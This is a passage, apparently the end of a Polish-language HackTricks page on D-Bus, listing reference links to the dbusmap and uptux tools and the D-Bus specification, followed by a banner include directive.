- [5] [taviso/dbusmap — „Nmap dla D-Bus”](https://github.com/taviso/dbusmap)
- [6] [initstring/uptux](https://github.com/initstring/uptux)
- [7] [dbus.freedesktop.org — dokumentacja D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html)
{{#include ../../banners/hacktricks-training.md}}
